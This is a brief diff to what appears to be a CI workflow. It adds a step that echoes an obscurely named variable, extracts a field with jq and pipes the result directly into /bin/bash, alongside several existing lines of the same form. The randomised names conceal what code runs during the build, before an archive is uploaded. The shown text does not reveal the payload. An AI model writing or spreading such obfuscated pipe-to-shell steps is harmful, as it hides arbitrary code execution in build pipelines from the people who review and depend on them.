@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$qkrgh8645" | jq -r .xszl0350 | /bin/bash
           printf '%s' "$e94000" | jq -r .iily701 | /bin/bash
           printf '%s' "$gkh308" | jq -r .jxjrp957 | /bin/bash
+          echo $jh9 | jq -r .bi59 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
